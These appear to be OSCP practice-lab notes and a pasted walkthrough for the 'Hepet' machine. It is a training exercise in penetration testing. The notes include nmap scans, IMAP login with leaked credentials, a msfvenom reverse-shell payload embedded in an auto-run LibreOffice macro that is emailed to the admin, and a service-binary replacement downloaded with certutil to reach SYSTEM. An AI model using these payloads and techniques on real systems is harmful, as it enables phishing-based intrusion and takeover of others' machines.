## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hepet]
└─$ ~/tools/nmapAutomator/nmapAutomator.sh -H 192.168.154.140 -t Full

Running a Full scan on 192.168.154.140

Host is likely running Unknown OS!


---------------------Starting Full Scan------------------------



PORT      STATE SERVICE
25/tcp    open  smtp
79/tcp    open  finger
105/tcp   open  csnet-ns
106/tcp   open  pop3pw
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
443/tcp   open  https
445/tcp   open  microsoft-ds
2224/tcp  open  efi-mg
5040/tcp  open  unknown
7680/tcp  open  pando-pub
11100/tcp open  unknown
20001/tcp open  microsan
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown



Making a script scan on all ports



PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: TOP UIDL EXPIRE(NEVER) USER APOP
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: OK X-MERCURY-1A0001 CAPABILITY AUTH=PLAIN complete IMAP4rev1
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|_    Unknown security type (40)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
|_ftp-bounce: bounce working!
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-09-03T12:42:12
|_  start_date: N/A
```

[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hepet]
└─$ finger @192.168.154.140
Login: Admin         Name: Mail System Administrator

[No profile information]
```

## Nmap 

Nmap 重掃一次，OSCP 以這個 command 為主

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hepet]
└─$ sudo nmap -A -sC -T4 192.168.154.140
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-03 21:25 CST
Nmap scan report for 192.168.154.140
Host is up (0.32s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp   open  finger        Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
106/tcp  open  pop3pw        Mercury/32 poppass service
110/tcp  open  pop3          Mercury/32 pop3d
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          Mercury/32 imapd 4.62
|_imap-capabilities: X-MERCURY-1A0001 complete IMAP4rev1 AUTH=PLAIN OK CAPABILITY
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
8000/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Time Travel Company Page
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/3%OT=25%CT=1%CU=40964%PV=Y%DS=4%DC=T%G=Y%TM=64F489AB
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=10A%GCD=1%ISR=10C%TI=I%TS=U)OPS(O1=M
OS:54ENW0NNS%O2=M54ENW0NNS%O3=M54ENW0%O4=M54ENW0NNS%O5=M54ENW0NNS%O6=M54ENN
OS:S)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W5=4000%W6=4000)ECN(R=Y%DF=Y%T=80%
OS:W=4000%O=M54ENW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(
OS:R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A678%RUD=G)I
OS:E(R=N)

Network Distance: 4 hops
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-09-03T13:26:48
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   429.10 ms 192.168.45.1
2   428.94 ms 192.168.45.254
3   429.13 ms 192.168.251.1
4   429.19 ms 192.168.154.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.24 seconds
```

---

# Exploitation Guide for Hepet

## Summary

In this walkthrough, we will exploit the target by finding out important information in emails, accessed using leaked credentials. We will use this information to send a spreadsheet containing a malicious macro, which will give us a low privilege shell. We will then escalate our privileges by exploiting a misconfigured service.

## Enumeration

### Nmap

We'll begin with an `nmap` scan.

```
kali@kali:~$ sudo nmap -sC -sV 192.168.120.132
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 14:43 -03
Nmap scan report for 192.168.120.132
Host is up (0.22s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE  VERSION
25/tcp   open  smtp     Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME,
79/tcp   open  finger   Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
106/tcp  open  pop3pw   Mercury/32 poppass service
110/tcp  open  pop3     Mercury Mail Transport System pop3d
|_pop3-capabilities: UIDL TOP APOP EXPIRE(NEVER) USER
143/tcp  open  imap     Mercury/32 imapd 4.62
|_imap-capabilities: AUTH=PLAIN CAPABILITY X-MERCURY-1A0001 IMAP4rev1 complete OK
443/tcp  open  ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
8000/tcp open  http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.43 seconds
```

### Web Enumeration

We can further enumerate port 8000.

```
kali@kali:~$ curl -s http://192.168.120.132:8000/ | html2markdown
TIME TRAVEL

# TIME TRAVEL

We specialize in sending you 33 years in any direction, past or future!

Subscribe

...

#### Meet us at our HQ

![Paris](team/ela_arwel.jpeg)

**Ela Arwel**

System Administrator

![New York](team/charlotte.jpeg)

**Charlotte D.**

Security & Pentester

![San Francisco](team/magnus.jpeg)

**Magnus U.**

Designer

![Paris](team/agnes.jpeg)

**Agnes T.**

Public Relations

![New York](team/jonas.jpeg)

**Jonas K.**

SicMundusCreatusEst

![San Francisco](team/martha.jpeg)

**Martha U.**

Writter
...
```

We will take note of the team members here for potential usernames. We can also see that Jonas' description seems out of the ordinary, which could be a password.

### Email Enumeration

Let's test this theory by attempting to log into the email server.

```
kali@kali:~$ nc 192.168.120.132 143
* OK localhost IMAP4rev1 Mercury/32 v4.62 server ready.

tag login jonas@localhost SicMundusCreatusEst
tag OK LOGIN completed.

tag LIST "" "*"
* LIST (\NoInferiors) "/" INBOX
tag OK LIST completed.

```

The username and credentials are correct, and we are able to list the emails. Let's continue the enumeration and try to read the emails.

```
tag SELECT INBOX
* 5 EXISTS
* 0 RECENT
* FLAGS (\Deleted \Draft \Seen \Answered)
* OK [UIDVALIDITY 1603187673] UID Validity
* OK [UIDNEXT 6] Predicted next UID
* OK [PERMANENTFLAGS (\Deleted \Draft \Seen \Answered)] Settable message flags
tag OK [READ-WRITE] SELECT completed.

tag STATUS INBOX (MESSAGES)
* STATUS INBOX (MESSAGES 5)
tag OK STATUS completed.

tag fetch 1 (BODY[1])
* 1 FETCH (BODY[1] {134}
Hey Jonas,

Please change your password, you cannot use the same password as your one liner description, just dont.

Thanks!
)
* 1 FETCH (FLAGS (\SEEN))
tag OK FETCH complete.
```

We can fetch the rest of the messages, and their headers, with the following command.

```
tag fetch 2:5 BODY[HEADER] BODY[1]
* 2 FETCH (BODY[HEADER] {739}
...
From: "mailadmin@localhost" <mailadmin@localhost>
To: "agnes@localhost" <agnes@localhost>
Cc: "jonas@localhost" <jonas@localhost>,
 "magnus@localhost" <magnus@localhost>
Subject: Important
...

 BODY[1] {311}
Team,

We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility.

I will forward all the documents after checking everything is working okay.

Sorry for the inconveniences.


)
* 3 FETCH (BODY[HEADER] {643}
...
From: "martha@localhost" <martha@localhost>
To: "jonas@localhost" <jonas@localhost>
Subject: Love
...

 BODY[1] {23}
Forever and ever?


)
* 4 FETCH (BODY[HEADER] {745}
...
From: "agnes@localhost" <agnes@localhost>
To: "mailadmin@localhost" <mailadmin@localhost>
Cc: "jonas@localhost" <jonas@localhost>,
 "magnus@localhost" <magnus@localhost>
Subject: Contacts Information
...

 BODY[1] {300}
Hi team!

I'm new here, will be doing PR for the company.
Its a pleasure to work with all of you!

If you can please send to mailadmin the spreadsheet for printing with all the company contacts will be really apreciated .

Ela, can you install the office suite on my machine?

Cheers!


)
* 5 FETCH (BODY[HEADER] {602}
...
Subject: Welcome to Pegasus Mail!
...

 BODY[1] {4659}
--Alt-Boundary-10616.1138921265
...

Welcome to Pegasus Mail!

...

tag OK FETCH complete.
```

In these emails, we discover that the `mailadmin@localhost` address is processing spreadsheets. We also discover that the office suite used is LibreOffice. This likely means that it will accept `.ods` or `.xls` files, which might be a good opportunity for a macro attack.

## Exploitation

### LibreOffice Macro

First, let's create a `hta` file that will contain our payload.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=443 -f hta-psh -o evil.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6618 bytes
Saved as: evil.hta
```

Inside this file, we can find the following command.

```
"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBT....QAcwApADsA"
```

VBA has a 255-character limit for literal strings, but this restriction does not apply to strings stored in variables.

Our goal is to transform this giant string in smaller chunks, like this.

```
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc"
Str = Str + "wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA"
Str = Str + "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A"
...
Str = Str + "EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ"
Str = Str + "AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ"
Str = Str + "QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB"
Str = Str + "zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA"
Str = Str + "HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ"
Str = Str + "AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc"
Str = Str + "wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB"
Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
Str = Str + "AdABhAHIAdAAoACQAcwApADsA"
```

We can accomplish this using a simple script, such as this.

```python
s = "powershell.exe -nop -w hidden -e aQBmA...CQAcwApADsA"

n = 50
for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
```

```
kali@kali:~$ python3 transform.py
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc"
Str = Str + "wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA"
Str = Str + "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A"
...
Str = Str + "EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ"
Str = Str + "AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ"
Str = Str + "QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB"
Str = Str + "zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA"
Str = Str + "HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ"
Str = Str + "AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc"
Str = Str + "wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB"
Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
Str = Str + "AdABhAHIAdAAoACQAcwApADsA"
```

We can now create our LibreOffice macro.

Create a new `.ods` file in LibreOffice Calc, then create a macro in that file. The macro will look like this.

```
Sub Exploit

   Dim Str As String

   Str = Str + "cmd.exe /C powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
   Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
   Str = Str + "AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc"
   Str = Str + "wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA"
   Str = Str + "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A"
   ...
   Str = Str + "EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ"
   Str = Str + "AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ"
   Str = Str + "QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB"
   Str = Str + "zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA"
   Str = Str + "HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ"
   Str = Str + "AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc"
   Str = Str + "wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB"
   Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
   Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
   Str = Str + "AdABhAHIAdAAoACQAcwApADsA"

   Shell(Str)

End Sub
```

We then need to make this macro run automatically when the document is opened.

We can accomplish this by going to the **Tools -> Customize** menu, then going to the **Events** tab. There, assign the macro to the **Open Document** event.

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_65_image_1_MeZCcUr4.png)

### Sending the Email

While there are many options for this, we will use a simple command line tool.

```
kali@kali:~$ sendemail -f 'jonas@localhost' \
                       -t 'mailadmin@localhost' \
                       -s 192.168.120.132:25 \
                       -u 'Your spreadsheet' \
                       -m 'Here is your requested spreadsheet' \
                       -a bomb.ods
```

In this command, we send an email to `mailadmin@localhost` containing our `bomb.ods` attachment.

After sending that email, all that remains is to wait (it can take up to five minutes).

```
kali@kali:~$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.132] 49795
Microsoft Windows [Version 10.0.18363.1139]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program>whoami
whoami
hepet\ela arwel

C:\Program Files\LibreOffice\program>
```

## Escalation

While exploring the system, we find a service that grabs out attention.

```

C:\>wmic service get name,displayname,pathname,startmode |findstr /i "auto"
...
Veyon Service     VeyonService      C:\Users\Ela Arwel\Veyon\veyon-service.exe    Auto UnistackSvcGroup    Auto
...
```

The service is installed in our user's folder, so we should have full permissions to modify it.

It also runs with system privileges.

```
C:\>sc qc VeyonService
sc qc VeyonService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VeyonService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\Ela Arwel\Veyon\veyon-service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Veyon Service
        DEPENDENCIES       : Tcpip
                           : RpcSs
        SERVICE_START_NAME : LocalSystem

```

Let's create a reverse shell and try to replace this service's binary with our own.

```
kali@kali:~$  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=443 -f exe -o veyon-service.exe
```

We start a simple **Python HTTP Server** to be able to transfer the file.

```
kali@kali:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now on the remote Windows machine, we make a backup of the service's binary, and download our malicious version.

```
C:\>cd C:\Users\Ela Arwel\Veyon\

C:\Users\Ela Arwel\Veyon>move veyon-service.exe veyon-service.bak
        1 file(s) moved.

C:\Users\Ela Arwel\Veyon>certutil -f -urlcache http://192.168.118.8:8000//veyon-service.exe veyon-service.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

After setting up a new listener and rebooting the machine, we receive a system shell.

```
kali@kali:~$ sudo nc -lvnp 443
listening on [any] 443 ...
```

```
C:\Users\Ela Arwel\Veyon>shutdown /r
shutdown /r
```

```
kali@kali:~$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.132] 49669

Microsoft Windows [Version 10.0.18363.1139]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```